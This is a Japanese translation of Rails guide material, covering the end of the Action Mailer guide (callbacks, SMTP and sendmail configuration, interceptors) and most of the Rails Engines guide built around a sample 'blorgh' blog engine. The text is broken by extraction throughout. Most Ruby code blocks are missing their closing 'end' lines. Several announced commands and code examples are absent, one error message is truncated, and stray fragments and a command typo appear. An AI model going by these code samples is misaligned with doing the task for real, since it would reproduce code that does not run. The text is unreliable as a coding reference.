         delivery_method_options: delivery_options)
### テンプレートをレンダリングせずにメール送信する
メール送信時にテンプレートのレンダリングをスキップしてメール本文を単なる文字列にしたくなることがあります。
このような場合には`:body`オプションを使用できます。
このオプションを使用する場合は、必ず`:content_type`オプションも指定してください。
指定しなかった場合はデフォルトの`text/plain`が適用されます。
  def welcome_email(user, email_body)
    mail(to: user.email,
         body: email_body,
         content_type: "text/html",
         subject: "レンダリングしました")
メールを受信する
Action Mailerを使用するメールの受信と解析は、メール送信に比べてやや複雑です。
Railsアプリケーションでメールを受信できるようにするためには、その前にメール受信待ちするRailsアプリケーションに何らかの形でメールが転送されるようにしておく必要があります。
Railsアプリケーションでメールを受信できるようにするためには、以下の作業が必要になります。
* メイラーに`receive`メソッドを実装する
* `/(アプリのパス)/bin/rails runner 'UserMailer.receive(STDIN.read)'`でメールを受信するアプリケーションに、メールサーバーからメールを転送する。
いずれかのメイラーに`receive`メソッドを定義すると、受信した生のメールはAction Mailerによって解析され、emailオブジェクトに変換されてデコードされた後、メイラーが新たにインスタンス化され、そのメイラーの`receive`インスタンスメソッドに渡されます。
以下に例を示します。
  def receive(email)
    page = Page.find_by(address: email.to.first)
    page.emails.create(
      subject: email.subject,
      body: email.body
    )
    if email.has_attachments?
      email.attachments.each do |attachment|
        page.attachments.create({
          file: attachment,
          description: email.subject
        })
Action Mailerのコールバック
Action Mailerでは`before_action`、`after_action`および`around_action`というコールバックを指定できます。
* コントローラと同様、メイラークラスのメソッドにもフィルタ付きのブロックまたはシンボルを1つ指定することができます。
* `before_action`コールバックを使用してmailオブジェクトにデフォルト値やdelivery_method_optionsを与えたり、デフォルトのヘッダと添付を挿入することもできます。
* `after_action`コールバックも`before_action`と同様の設定を行いますが、メイラーのアクション内のインスタンス変数を使用します。
  after_action :set_delivery_options,
               :prevent_delivery_to_guests,
               :set_business_headers
  def feedback_message(business, user)
    @business = business
    mail
  def campaign_message(business, user)
  private
    def set_delivery_options
      # ここではメールのインスタンスや
      # @businessや@userインスタンス変数にアクセスできる
      if @business && @business.has_smtp_settings?
        mail.delivery_method.settings.merge!(
    def prevent_delivery_to_guests
      if @user && @user.guest?
        mail.perform_deliveries = false
    def set_business_headers
      if @business
        headers["X-SMTPAPI-CATEGORY"] = @business.code
* メールのbodyにnil以外の値が設定されている場合、Mailer Filtersは処理を中止します。
Action Mailerヘルパーを使用する
Action Mailerは`AbstractController`を継承しているので、Action Controllerと同様に一般的なヘルパーメソッドを使用できます。
Action Mailerを設定する
以下の設定オプションは、environment.rbやproduction.rbなどの環境設定ファイルのいずれかで使用するのが最適です。
| 設定 | 説明 |
|---------------|-------------|
|`logger`|可能であればメール送受信に関する情報を生成します。
`nil`を指定するとログ出力を行わなくなります。
Ruby自身の`Logger`ロガーおよび`Log4r`ロガーのどちらとも互換性があります。
|`smtp_settings`|`:smtp`の配信メソッドの詳細設定を行います。
<ul><li>`:address` - リモートのメールサーバーの使用を許可する。
デフォルトは`"localhost"`であり、必要に応じて変更する。</li>
<li>`:port` - メールサーバーが万一ポート25番で動作していない場合はここで変更する。</li>
<li>`:domain` - HELOドメインを指定する必要がある場合はここで行なう。</li>
<li>`:user_name` - メールサーバーで認証が必要な場合はここでユーザー名を指定する。</li>
<li>`:password` - メールサーバーで認証が必要な場合はここでパスワードを指定する。</li>
<li>`:authentication` - メールサーバーで認証が必要な場合はここで認証の種類を指定する。
|`sendmail_settings`|`:sendmail`の配信オプションを上書きします。
<ul><li>`:location` - sendmailの実行可能ファイルの場所を指定する。
デフォルトは`/usr/sbin/sendmail`。</li>
<li>`:arguments` - sendmailに渡すコマンドライン引数を指定する。
デフォルトは`-i -t`。</li></ul>|
|`raise_delivery_errors`|メール配信に失敗した場合にエラーを発生するかどうかを指定します。
このオプションは、外部のメールサーバーが即時配信を行っている場合にのみ機能します。
|`delivery_method`|配信方法を指定します。
以下の配信方法を指定可能です。<ul>
<li>`:smtp` (default) -- `config.action_mailer.smtp_settings`で設定可能。</li>
<li>`:sendmail` -- `config.action_mailer.sendmail_settings`で設定可能。</li>
<li>`:file`: -- メールをファイルとして保存する。`config.action_mailer.file_settings`で設定可能。</li>
<li>`:test`: -- メールを配列`ActionMailer::Base.deliveries`に保存する。</li>
</ul>詳細については[APIドキュメント](http://api.rubyonrails.org/classes/ActionMailer/Base.html)を参照。
|`perform_deliveries`|Mailのメッセージに`deliver`メソッドを実行したときに実際にメール配信を行なうかどうかを指定します。
デフォルトでは配信が行われます。機能テストなどで配信を一時的にオフにしたい場合に便利です。
|`deliveries`|`delivery_method :test`を使用してAction Mailerから送信されたメールの配列を保持します。
単体テストおよび機能テストで最も便利です。
|`default_options`|`mail`メソッドオプション (`:from`、`:reply_to`など)のデフォルト値を設定します。
設定オプションの完全な説明については「Railsアプリケーションを設定する」ガイドの[Action Mailerを設定する](configuring.html#action-mailerを設定する)を参照してください。
### Action Mailerの設定例
適切な`config/environments/$RAILS_ENV.rb`ファイルに追加する設定の例を以下に示します。
config.action_mailer.delivery_method = :sendmail
デフォルトは以下のとおりです。
# config.action_mailer.sendmail_settings = {
#   location: '/usr/sbin/sendmail',
#   arguments: '-i -t'
config.action_mailer.perform_deliveries = true
config.action_mailer.raise_delivery_errors = true
config.action_mailer.default_options = {from: 'no-reply@example.com'}
### Gmail用のAction Mailer設定
Action Mailerに[Mail gem](https://github.com/mikel/mail)が導入されたので、`config/environments/$RAILS_ENV.rb`ファイルの設定は以下のように非常に簡単になりました。
config.action_mailer.delivery_method = :smtp
config.action_mailer.smtp_settings = {
  address:              'smtp.gmail.com',
  port:                 587,
  domain:               'example.com',
  user_name:            '<ユーザー名>',
  password:             '<パスワード>',
  authentication:       'plain',
  enable_starttls_auto: true  }
メイラーのテスト
メイラーのテスト方法の詳細についてはテスティングガイドの[メイラーをテストする](testing.html#メイラーをテストする)を参照してください。
メールを配信直前に加工する
-------------------
メールを配信する前に何らかの編集を加えたいことがあります。
幸い、Action Mailerにはすべてのメールの配信前に処理を加えるためのフックが提供されています。
これを使用して、メールが配信エージェントに最終的に渡される直前にメールの内容を変更するためのインターセプタを登録することができます。
class SandboxEmailInterceptor
  def self.delivering_email(message)
    message.to = ['sandbox@example.com']
インターセプタが動作するようにするには、Action Mailerフレームワークに登録する必要があります。
これは、以下のようにイニシャライザファイル`config/initializers/sandbox_email_interceptor.rb`で行います。
NOTE: 上の例では"staging"というカスタマイズした環境を使用しています。これは本番 (production環境) に準じた状態でテストを行うための環境です。
Railsのカスタム環境については[Rails環境を作成する](configuring.html#rails環境を作成する)を参照してください。
Rails エンジン入門
本ガイドでは、Railsのエンジンについて解説します。また、簡潔で使いやすいインターフェイスを使った、ホストアプリケーション向け追加機能についても解説します。
* エンジンの役割
* エンジンの生成方法
* エンジンのビルド機能
* エンジンをアプリケーションにフックする
* アプリケーションのエンジン機能を上書きする
Railsにおけるエンジンの役割
エンジン (engine) とは、アプリケーションのミニチュアのようなものであり、ホストアプリケーションに機能を提供します。
Railsアプリケーションは実際にはエンジンに「ターボをかけた」ようなものにすぎず、`Rails::Application`クラスは`Rails::Engine`から多くの振る舞いを継承しています。
従って、エンジンとアプリケーションは、細かな違いを除けばほぼ同じものであると考えていただいてよいでしょう。本ガイドでもこの点をたびたび確認します。
エンジンとアプリケーションは、同じ構造を共有しています。
エンジンは、プラグインとも密接に関連します。
エンジンもプラグインも、共通の`lib`ディレクトリ構造を共有し、どちらも`rails plugin new`ジェネレータを使用して生成されます。
両者に違いがあるとすれば、Railsはエンジンを一種の「完全なプラグイン」とみなしている点です。これは、エンジンを生成するにはジェネレータコマンドで`--full`を与えることからもわかります。
実際にはこのガイドでは`--mountable`オプションを使用します。これは`--full`のオプション以外にもいくつかの機能を追加してくれます。
以後本ガイドでは「完全なプラグイン (full plugin)」を単に「エンジン」と呼びます。
エンジンはプラグインになることもでき、プラグインがエンジンになることもできます。
本ガイドで説明のために作成するエンジンに "blorgh" (blogのもじり) という名前を付けます。
このエンジンはブログ機能をホストアプリケーションに追加し、記事とコメントを作成できます。
本ガイドでは、最初にこのエンジンを単体で動作するようにし、後にこのエンジンをアプリケーションにフックします。
エンジンはホストアプリケーションと混じらないよう分離しておくこともできます。
これは、あるアプリケーションが`articles_path`のようなルーティングヘルパーによってパスを提供できるとすると、そのアプリケーションのエンジンも同じく`articles_path`というヘルパーによってパスを提供でき、しかも両者が衝突しないということを意味します。
これにともない、コントローラ名、モデル名、テーブル名はいずれも名前空間化されます。
これについては本ガイドで後述します。
ここが重要です。アプリケーションは **いかなる場合も** エンジンよりも優先されます。
ある環境において、最終的な決定権を持つのはアプリケーション自身です。
エンジンはアプリケーションの動作を大幅に変更するものではなく、アプリケーションを単に拡張するものです。
その他のエンジンに関するドキュメントについては、[Devise](https://github.com/plataformatec/devise) (親アプリケーションに認証機能を提供するエンジン) や [Forem](https://github.com/radar/forem) (フォーラム機能を提供するエンジン) を参照してください。
この他に、[Spree](https://github.com/spree/spree) (eコマースプラットフォーム) や[RefineryCMS](https://github.com/refinery/refinerycms) (CMSエンジン) などもあります。
追伸。エンジン機能はJames Adam、Piotr Sarnacki、Railsコアチーム、そして多くの人々の助けなしではできあがらなかったでしょう。
彼らに会うことがあったら、ぜひお礼を述べてやってください。
エンジンを生成する
エンジンを生成するには、プラグインジェネレータを実行し、必要に応じてオプションをジェネレータに渡します。
"blorgh"の場合はマウント可能なエンジンとして生成するので、ターミナルで以下のコマンドを実行します。
プラグインジェネレータで利用できるオプションの一覧をすべて表示するには、以下を入力します。
`--mountable`オプションは、マウント可能かつ名前空間で分離されたエンジンを生成する場合に使用します。
このジェネレータで生成したプラグインは、`--full`オプションを使用した場合と同じスケルトン構造を持ちます。
`--full`オプションは、以下を提供するスケルトン構造を含むエンジンを作成します。
  * `app`ディレクトリツリー
  * `config/routes.rb`ファイル
    Rails.application.routes.draw do
  * `lib/blorgh/engine.rb`ファイルは、Railsアプリケーションが標準で持つ`config/application.rb`ファイルと同一の機能を持ちます。
    module Blorgh
      class Engine < ::Rails::Engine
  end
`--mountable`オプションを使用すると、`--full`オプションに以下が追加されます。
  * アセットマニフェストファイル (`application.js`および`application.css`)
  * 名前空間化された`ApplicationController`スタブ
  名前空間化された`ApplicationHelper`スタブ
  * エンジンで使用するレイアウトビューテンプレート
  * `config/routes.rb`での名前空間分離
    Blorgh::Engine.routes.draw do
  * `lib/blorgh/engine.rb`での名前空間分離
        isolate_namespace Blorgh
さらに、`--mountable`オプションはダミーのテスト用アプリケーションを `test/dummy`に配置するようジェネレータに指示します。これは、以下のダミーアプリケーションのルーティングファイルを`test/dummy/config/routes.rb`に追加することによって行います。
mount Blorgh::Engine => "/blorgh"
### エンジンの内部
#### 重要なファイル
新しく作成したエンジンのルートディレクトリには、`blorgh.gemspec`というファイルが置かれます。
アプリケーションにこのエンジンを後からインクルードするには、`Gemfile`に以下の行を追加します。
gem 'blorgh', path: "vendor/engines/blorgh"
Gemfileを更新したら、いつものように`bundle install`を実行するのを忘れずに。
エンジンを通常のgemと同様に`Gemfile`に記述すると、Bundlerはgemと同様にエンジンを読み込み、`blorgh.gemspec`ファイルを解析し、`lib`以下に置かれているファイル (この場合`lib/blorgh.rb`) をrequireします。
このファイルは、(`lib/blorgh/engine.rb`に置かれている) `blorgh/engine.rb`ファイルをrequireし、`Blorgh`という基本モジュールを定義します。
require "blorgh/engine"
module Blorgh
TIP: エンジンによっては、このファイルをエンジンのためのグローバル設定オプションとして配置したいこともあるでしょう。
これは比較的よいアイディアです。設定オプションを提供したい場合は、エンジンで`module`と呼ばれているファイルを、まさにこれを行なうのにふさわしい場所として定義します。
そのモジュールの中にメソッドを置くことで準備は完了します。
エンジンの基本クラスは`lib/blorgh/engine.rb`の中にあります。
  class Engine < ::Rails::Engine
    isolate_namespace Blorgh
`Rails::Engine`クラスを継承することによって、指定されたパスにエンジンがあることがgemからRailsに通知され、アプリケーションの内部にエンジンが正しくマウントされます。そして、エンジンの`app`ディレクトリをモデル/メイラー/コントローラ/ビューの読み込みパスに追加します。
ここで、`isolate_namespace`メソッドについて特別な注意が必要です。
このメソッドの呼び出しは、エンジンのコントローラ/モデル/ルーティングなどが持つ固有の名前空間を、アプリケーション内部のコンポーネントが持つ類似の名前空間から分離する役目を担います。
この呼び出しが行われないと、エンジンのコンポーネントがアプリケーション側に「漏れ出す」リスクが生じ、思わぬ動作が発生したり、エンジンの重要なコンポーネントが同じような名前のアプリケーション側コンポーネントによって上書きされてしまったりする可能性があります。
名前の衝突の例として、ヘルパーを取り上げましょう。
`isolate_namespace`が呼び出されないと、エンジンのヘルパーがアプリケーションのコントローラにインクルードされてしまう可能性があります。
NOTE: `Engine`クラスの定義に含まれる`isolate_namespace`の行を変更/削除しないことを **強く** 推奨します。
この行が変更されると、生成されたエンジン内のクラスがアプリケーションと衝突する **可能性があります** 。
名前空間を分離するということは、`bin/rails g model`の実行によって生成されたモデル (ここでは `bin/rails g model article`を実行したとします) は`Article`にならず、名前空間化されて`Blorgh::Article`になるということです。
さらにモデルのテーブルも名前空間化され、単なる`articles`ではなく`blorgh_articles`になります。
コントローラもモデルと同様に名前空間化されます。`ArticlesController`というコントローラは`Blorgh::ArticlesController`になり、このコントローラのビューは`app/views/articles`ではなく`app/views/blorgh/articles`に置かれます。
メイラーも同様に名前空間化されます。
最後に、ルーティングもエンジン内で分離されます。
これは名前空間化の最も肝心な部分であり、これについては本ガイドの[ルーティング](#ルーティング)セクションで後述します。
#### `app`ディレクトリ
エンジンの`app`ディレクトリの中には、通常のアプリケーションでおなじみの標準の`assets`、`controllers`、`helpers`、`mailers`、`models`、`views`ディレクトリが置かれます。
このうち`helpers`、`mailers`、`models`ディレクトリにはデフォルトでは何も置かれないので、本セクションでは解説しません。
モデルについては、エンジンの作成について解説するセクションで後述します。
エンジンの`app/assets`ディレクトリの下にも、通常のアプリケーションと同様に`images`、`javascripts`、`stylesheets`ディレクトリがそれぞれあります。
通常のアプリケーションと異なる点は、これらのディレクトリの下にはさらにエンジン名を持つサブディレクトリがあることです。
これは、エンジンが名前空間化されるのと同様、エンジンのアセットも同様に名前空間化される必要があるからです。
`app/controllers`ディレクトリの下には`blorgh`ディレクトリが置かれます。この中には`application_controller.rb`というファイルが1つ置かれます。
このファイルはエンジンのコントローラ共通の機能を提供するためのものです。
この`blorgh`ディレクトリには、エンジンで使用するその他のコントローラを置きます。
これらのファイルを名前空間化されたディレクトリに配置することで、他のエンジンやアプリケーションに同じ名前のコントローラがあっても名前の衝突を避ける事ができます。
NOTE: あるエンジンに含まれる`ApplicationController`というクラスの名前は、アプリケーションそのものが持つクラスと同じ名前になっています。これは、アプリケーションをエンジンに変換しやすくするためです。
最後に、`app/views`ディレクトリの下には`layouts`フォルダがあります。ここには`blorgh/application.html.erb`というファイルが置かれます。
このファイルは、エンジンで使用するレイアウトを指定するためのものです。
エンジンが単体のエンジンとして使用されるのであれば、このファイルを使用していくらでも好きなようにレイアウトをカスタマイズできます。そのためにアプリケーション自身の`app/views/layouts/application.html.erb`ファイルを変更する必要はありません。
エンジンのレイアウトをユーザーに強制したくない場合は、このファイルを削除し、エンジンのコントローラでは別のレイアウトを参照するように変更してください。
#### `bin`ディレクトリ
このディレクトリには`bin/rails`というファイルが1つだけ置かれます。これはアプリケーション内で使用しているのと似た`rails`サブコマンドであり、ジェネレータです。
このような構成になっていることで、このエンジンで利用するための独自のコントローラやモデルを以下のように簡単に生成することができます。
$ bin/rails g model
言うまでもなく、`Engine`クラスに`isolate_namespace`を持つエンジンでこのbin/railsを使用して生成したものはすべて名前空間化されることにご注意ください。
#### `test`ディレクトリ
`test`ディレクトリは、エンジンがテストを行なうための場所です。
エンジンをテストするために、`test/dummy`ディレクトリに埋め込まれた縮小版のRailsアプリケーションが用意されます。
このアプリケーションはエンジンを`test/dummy/config/routes.rb`ファイル内で以下のようにマウントします。
  mount Blorgh::Engine => "/blorgh"
上の行によって、`/blorgh`パスにあるエンジンがマウントされ、アプリケーションのこのパスを通じてのみアクセス可能になります。
testディレクトリの下には`test/integration`ディレクトリがあります。ここにはエンジンの結合テストが置かれます。
`test`ディレクトリに他のディレクトリを作成することもできます。
たとえば、モデルのテスト用に`test/models`ディレクトリを作成しても構いません。
エンジンの機能を提供する
本ガイドで説明のために作成するエンジンには、記事とコメントの送信機能があります。基本的には[Railsをはじめよう](getting_started.html)とよく似たスレッドに従いますが、多少の新味も加えられています。
### Articleリソースを生成する
ブログエンジンで最初に生成すべきは`Article`モデルとそれに関連するコントローラです。
これらを手軽に生成するために、Railsのscaffoldジェネレータを使用します。
$ bin/rails generate scaffold article title:string text:text
上のコマンドを実行すると以下の情報が出力されます。
invoke  active_record
create    db/migrate/[timestamp]_create_blorgh_articles.rb
create    app/models/blorgh/article.rb
invoke  test_unit
create      test/models/blorgh/article_test.rb
create      test/fixtures/blorgh/articles.yml
invoke  resource_route
  resources :articles
invoke  scaffold_controller
create    app/controllers/blorgh/articles_controller.rb
invoke    erb 
create      app/views/blorgh/articles
create      app/views/blorgh/articles/index.html.erb
create      app/views/blorgh/articles/edit.html.erb
create      app/views/blorgh/articles/show.html.erb
create      app/views/blorgh/articles/new.html.erb
create      app/views/blorgh/articles/_form.html.erb
create      test/controllers/blorgh/articles_controller_test.rb
invoke    helper
create      app/helpers/blorgh/articles_helper.rb
invoke  assets
invoke    js
create      app/assets/javascripts/blorgh/articles.js
invoke    css
create      app/assets/stylesheets/blorgh/articles.css
invoke  css
create    app/assets/stylesheets/scaffold.css
scaffoldジェネレータが最初に行なうのは`active_record`ジェネレータの呼び出しです。これはマイグレーションの生成とそのリソースのモデルを生成します。
ここでご注目いただきたいのは、マイグレーションは通常の`create_articles`ではなく`create_blorgh_articles`という名前で呼ばれるという点です。
これは`Blorgh::Engine`クラスの定義で呼び出される`isolate_namespace`メソッドによるものです。
このモデルも名前空間化されるので、`Engine`クラス内のisolate_namespace`呼び出しによって、`app/models/article.rb`ではなく`app/models/blorgh/article.rb`に置かれます。
続いて、そのモデルに対応する`test_unit`ジェネレータが呼び出され、(`test/models/article_test.rb`ではなく) `test/models/blorgh/article_test.rb` にモデルのテストが置かれます (rather than )。フィクスチャも同様に (`test/fixtures/articles.yml`ではなく) `test/fixtures/blorgh/articles.yml`に置かれます。
その後、そのリソースに対応する行が`config/routes.rb`ファイルに挿入され、エンジンで使用されます。
ここで挿入される行は単に`resources :articles`となっています。これにより、そのエンジンで使用する`config/routes.rb`ファイルが以下のように変更されます。
Blorgh::Engine.routes.draw do
  resources :articles
このルーティングは、`YourApp::Application`クラスではなく`Blorgh::Engine`オブジェクトにもとづいていることにご注目ください。
これにより、エンジンのルーティングがエンジン自身に制限され、[testディレクトリ](#testディレクトリ)セクションで説明したように特定の位置にマウントできるようになります。
ここでは、エンジンのルーティングがアプリケーション内のルーティングから分離されていることにもご注目ください。
詳細については本ガイドの[ルーティング](#ルーティング)セクションで解説します。
続いて`scaffold_controller`ジェネレータが呼ばれ、`Blorgh::ArticlesController`という名前のコントローラを生成します (生成場所は`app/controllers/blorgh/articles_controller.rb`です)。このコントローラに関連するビューは`app/views/blorgh/articles`となります。
このジェネレータによって生成されるものはすべて正しく名前空間化されます。
このコントローラのクラスは、以下のように`Blorgh`モジュール内で定義されます。
  class ArticlesController < ApplicationController
    ...
NOTE: このクラスで継承されている`ApplicationController`クラスは、実際には`ApplicationController`ではなく、`Blorgh::ApplicationController`です。
`app/helpers/blorgh/articles_helper.rb`のヘルパーも同様に名前空間化されます。
  module ArticlesHelper
これにより、たとえ他のエンジンやアプリケーションにarticleリソースがあっても衝突を回避できます。
最後に、以下の2つのファイルがこのリソースのアセットとして生成されます。
`app/assets/javascripts/blorgh/articles.js`と
`app/assets/stylesheets/blorgh/articles.css`です。
これらの使用法についてはこのすぐ後で解説します。
デフォルトでは、scaffoldで生成されたスタイルはエンジンに適用されません。これは、エンジンのレイアウトファイル`app/views/layouts/blorgh/application.html.erb`がscaffoldのスタイルを読み込んでいないためです。
scaffoldで生成されたスタイルを適用するには、このレイアウトの`<head>`タグに以下の行を挿入します。
<%= stylesheet_link_tag "scaffold" %>
エンジンのルートディレクトリで`rake db:migrate`を実行すると、scaffoldジェネレータによって生成されたマイグレーションが実行されます。続いて`test/dummy`ディレクトリで`rails server`を実行してみましょう。
`http://localhost:3000/blorgh/articles`をブラウザで表示すると、生成されたデフォルトのscaffoldが表示されます。
表示されたものをいろいろクリックしてみてください。
これで、最初の機能を備えたエンジンの生成に成功しました。
コンソールで遊んでみたいのであれば、`rails console`でRailsアプリケーションをコンソールで動かせます。
先ほどから申し上げているように、`Article`モデルは名前空間化されていますので、このモデルを参照する際には`Blorgh::Article`と指定する必要があります。
>> Blorgh::Article.find(1)
=> #<Blorgh::Article id: 1 ...
最後の作業です。このエンジンの`articles`リソースはエンジンのルート (root) パスに置くのがふさわしいでしょう。
エンジンがマウントされているルートパスに移動したら、記事の一覧が表示されるようにしたいものです。
エンジンにある`config/routes.rb`ファイルに以下の記述を追加することでこれを実現できます。
root to: "articles#index"
これで、ユーザーが (`/articles`ではなく) エンジンのルートパスに移動すると記事の一覧が表示されるようになりました。
つまり、`http://localhost:3000/blorgh/articles`に移動しなくても`http://localhost:3000/blorgh`に移動すれば済むということです。
### commentsリソースを生成する
エンジンで記事を新規作成できるようになりましたので、今度は記事にコメントを追加する機能も付けてみましょう。
これを行なうには、commentモデルとcommentsコントローラを生成し、articles scaffoldを変更してコメントを表示できるようにし、それから新規コメントを作成できるようにします。
アプリケーションのルート・ディレクトリで、モデルのジェネレータを実行します。
このとき、`Comment`モデルを生成すること、integer型の`article_id`カラムとtext型の`text`カラムを持つテーブルと関連付けることを指示します。
$ bin/rails generate model Comment article_id:integer text:text
上によって以下が出力されます。
create    db/migrate/[timestamp]_create_blorgh_comments.rb
create    app/models/blorgh/comment.rb
invoke    test_unit
create      test/models/blorgh/comment_test.rb
create      test/fixtures/blorgh/comments.yml
このジェネレータ呼び出しでは必要なモデルファイルだけが生成されます。さらに`blorgh`ディレクトリの下で名前空間化され、`Blorgh::Comment`というモデルクラスも作成されます。
それではマイグレーションを実行してblorgh_commentsテーブルを生成してみましょう。
$ rake db:migrate
記事のコメントを表示できるようにするために、`app/views/blorgh/articles/show.html.erb`を編集して以下の行を"Edit"リンクの直前に追加します。
<h3>Comments</h3>
<%= render @article.comments %>
上の行では、`Blorgh::Article`モデルとコメントが`has_many`関連付けとして定義されている必要がありますが、現時点ではまだありません。
この定義を行なうために、`app/models/blorgh/article.rb`を開いてモデルに以下の行を追加します。
has_many :comments
これにより、モデルは以下のようになります。
  class Article < ActiveRecord::Base
    has_many :comments
NOTE: この`has_many`は`Blorgh`モジュールの中にあるクラスの中で定義されています。これだけで、これらのオブジェクトに対して`Blorgh::Comment`モデルを使用したいという意図がRailsに自動的に認識されます。従って、ここで`:class_name`オプションを使用してクラス名を指定する必要はありません。
続いて、記事を作成するためのフォームを作成する必要があります。
フォームを追加するには、`app/views/blorgh/articles/show.html.erb`の`render @article.comments`呼び出しの直後に以下の行を追加します。
<%= render "blorgh/comments/form" %>
続いて、この行を出力に含めるためのパーシャル (部分テンプレート) も必要です。
`app/views/blorgh/comments`にディレクトリを作成し、`_form.html.erb`というファイルを作成します。このファイルの中に以下のパーシャルを記述します。
<h3>New comment</h3>
<%= form_for [@article, @article.comments.build] do |f| %>
    <%= f.label :text %><br>
    <%= f.text_area :text %>
  </p>
このフォームが送信されると、エンジン内の`/articles/:article_id/comments`というルーティングに対して`POST`リクエストを送信しようとします。
このルーティングはまだ存在していませんので、`config/routes.rb`の`resources :articles`行を以下のように変更します。
resources :articles do
これでcomments用のネストしたルーティングが作成されました。これが上のフォームで必要となります。
ルーティングは作成しましたが、ルーティング先のコントローラがまだありません。
これを作成するには、アプリケーションのルート・ディレクトリで以下のコマンドを実行します。
$ bin/rails g controller comments
上によって以下が生成されます。
create  app/controllers/blorgh/comments_controller.rb
create    test/controllers/blorgh/comments_controller_test.rb
invoke  helper
create    app/helpers/blorgh/comments_helper.rb
create      app/assets/javascripts/blorgh/comments.js
create      app/assets/stylesheets/blorgh/comments.css
このフォームは`POST`リクエストを`/articles/:article_id/comments`に送信します。これに対応するのは`Blorgh::CommentsController`の`create`アクションです。
このアクションを作成する必要があります。`app/controllers/blorgh/comments_controller.rb`のクラス定義の中に以下の行を追加します。
def create
  @article = Article.find(params[:article_id])
  @comment = @article.comments.create(comment_params)
  flash[:notice] = "Comment has been created!"
  redirect_to articles_path
private
  def comment_params
    params.require(:comment).permit(:text)
いよいよ、コメントフォームが動作するのに必要な最後の手順を行いましょう。
コメントはまだ正常に表示できません。
この時点でコメントを作成しようとすると、以下のようなエラーが生じるでしょう。
:formats=>[:html], :locale=>[:en, :en]}. 
Searched in:   *
"/Users/ryan/Sites/side_projects/blorgh/test/dummy/app/views"   *
"/Users/ryan/Sites/side_projects/blorgh/app/views"
このエラーは、コメントの表示に必要なパーシャルが見つからないためです。
Railsはアプリケーションの (`test/dummy`) `app/views`を最初に検索し、続いてエンジンの`app/views`ディレクトリを検索します。
見つからない場合はエラーになります。
さしあたって、コメントテキストを出力する役目をこのパーシャルに担ってもらわなければなりません。
`app/views/blorgh/comments/_comment.html.erb`ファイルを作成し、以下の記述を追加します。
<%= comment_counter + 1 %>. <%= comment.text %>
`<%= render @article.comments %>`呼び出しによって`comment_counter`ローカル変数が返されます。この変数は自動的に定義され、コメントをiterateするたびにカウントアップします。
この例では、作成されたコメントの横に小さな数字を表示するのに使用しています。
これでブログエンジンのコメント機能ができました。
今度はこの機能をアプリケーションの中で使用してみましょう。
アプリケーションにフックする
エンジンをアプリケーションで利用するのはきわめて簡単です。
本セクションでは、エンジンをアプリケーションにマウントして必要な初期設定を行い、アプリケーションが提供する`User`クラスにエンジンをリンクして、エンジン内の記事とコメントに所有者を与えるところまでをカバーします。
### エンジンをマウントする
最初に、使用するエンジンをアプリケーションの`Gemfile`に記述する必要があります。
テストに使用できる手頃なアプリケーションが見当たらない場合は、エンジンのディレクトリの外で以下の`rails new`コマンドを実行してアプリケーションを作成してください。
$ rails new unicorn
基本的には、Gemfileでエンジンを指定する方法は他のgemの指定方法と変わりません。
gem 'devise'
ただし、この`blorgh`エンジンはローカルPCで開発中でgemリポジトリには存在しないので、`Gemfile`でエンジンgemへのパスを`:path`オプションで指定する必要があります。
gem 'blorgh', path: "/path/to/blorgh"
続いて`bundle`コマンドを実行し、gemをインストールします。
前述したように、`Gemfile`に記述したgemはRailsの読み込み時に読み込まれます。
このgemは最初にエンジンの`lib/blorgh.rb`をrequireし、続いて`lib/blorgh/engine.rb`をrequireします。後者はこのエンジンの機能を担う主要な部品が定義されている場所です。
アプリケーションからエンジンの機能にアクセスできるようにするには、エンジンをアプリケーションの`config/routes.rb`ファイルでマウントする必要があります。
mount Blorgh::Engine, at: "/blog"
この行を記述することで、エンジンがアプリケーションの`/blog`パスにマウントされます。
`rails server`を実行してRailsを起動すること、`http://localhost:3000/blog`にアクセスできるようになります。
NOTE: Deviseなどの他のエンジンではこの点が若干異なり、ルーティングで (`devise_for`などの) カスタムヘルパーを指定するものがあります。
これらのヘルパーの動作は完全に同じです。事前に定義されたカスタマイズ可能なパスにエンジンの機能の一部をマウントします。
### エンジンの設定
作成したエンジンには`blorgh_articles`テーブルと`blorgh_comments`テーブル用のマイグレーションが含まれます。これらのテーブルをアプリケーションのデータベースに作成し、エンジンのモデルからこれらのテーブルにアクセスできるようにする必要があります。
これらのマイグレーションをアプリケーションにコピーするには、以下のコマンドを実行します。
$ rake blorgh:install:migrations
マイグレーションをコピーする必要のあるエンジンがいくつもある場合は、代りに`railties:install:migrations`を使用します。
$ rake railties:install:migrations
このコマンドは、初回実行時にエンジンからすべてのマイグレーションをコピーします。
次回以降の実行時には、コピーされていないマイグレーションのみがコピーされます。
このコマンドの初回実行時の出力結果は以下のようになります。
最初のタイムスタンプ (`[timestamp_1]`) が現在時刻、次のタイムスタンプ (`[timestamp_2]`) が現在時刻に1秒追加した値になります。
このようになっているのは、エンジンのマイグレーションはアプリケーションの既存のマイグレーションがすべて終わってから実行する必要があるためです。
アプリケーションのコンテキストでマイグレーションを実行するには、単に`rake db:migirate`を実行します。
`http://localhost:3000/blog`でエンジンにアクセスすると、記事は空の状態です。
これは、アプリケーションの内部で作成されたテーブルはエンジンの内部で作成されたテーブルとは異なるためです。
新しくマウントしたエンジンでもっといろいろやってみましょう。
アプリケーションの動作は、エンジンを単体で動かしているときと同じであることに気付くことでしょう。
エンジンを1つだけマイグレーションしたい場合、以下のように`SCOPE`を指定します。
rake db:migrate SCOPE=blorgh
このオプションは、エンジンを削除する前にマイグレーションを元に戻したい場合などに便利です。
blorghエンジンによるすべてのマイグレーションを基に戻したい場合は以下のようなコマンドを実行します。
rake db:migrate SCOPE=blorgh VERSION=0
### アプリケーションが提供するクラスを使用する
#### アプリケーションが提供するモデルを使用する
エンジンをひとつ作成すると、やがてエンジンの部品とアプリケーションの部品を連携させるために、アプリケーションの特定のクラスをエンジンから利用したくなるでしょう。
この`blorgh`エンジンであれば、記事とコメントの作者の情報がある方がずっとわかりやすくなります。
普通のアプリケーションであれば、記事やコメントの作者を表すための`User`クラスが備わっているでしょう。
しかしクラス名がUserとは限りません。アプリケーションによっては`Person`というクラスであるかもしれません。
このような状況に対応するために、このエンジンでは`User`クラスとの関連付けをハードコードしないようにすべきです。
ここでは話を簡単にするため、アプリケーションがユーザーを表すために持つクラスは`User`であるとします (この後でもっとカスタマイズしやすくします)。
このクラスは、アプリケーションで以下のコマンドを実行して生成できます。
rails g model user name:string
今後`users`テーブルをアプリケーションで使用できるようにするために、ここで`rake db:migrate`を実行する必要があります。
